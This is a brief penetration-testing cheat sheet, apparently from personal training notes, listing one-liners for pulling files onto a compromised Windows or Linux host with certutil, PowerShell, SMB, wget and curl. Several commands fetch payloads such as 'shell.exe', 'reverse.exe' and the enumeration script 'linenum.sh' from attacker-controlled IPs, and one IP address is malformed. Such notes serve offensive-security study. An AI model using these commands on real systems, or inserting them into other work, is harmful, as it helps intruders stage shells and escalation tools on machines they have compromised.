# File Download

## Windows

### CMD&#x20;

```
certutil.exe -urlcache -split -f “http://192.168.119.288/shell.exe”
```

https://zetc0de.github.io/post/powershell-download-file-one-liners/

### POWERSHELL

**PowerShell (any version)**&#x20;

```
(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
```

**PowerShell 4.0 & 5.0**&#x20;

```
Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"
```

**Command is like curl**

```
PS C:> $wc = New-Object Net.WebClient 
PS C:> $wc.DownloadString("http://target/?whoami")
```

**Via SMB**

```
\\192.168.1.1\share\reverse.exe
```

**FTP -** Look details at under this node for non interactive shells.

## Linux

```
wget http://192.168.119.228/linenum.sh
curl http://192.168.1.1/linenum.sh -o linenum.sh
curl http://192.168.1.1/linenum.sh > linenum.sh
```

**FTP -** Look details at under this node for non interactive shells.
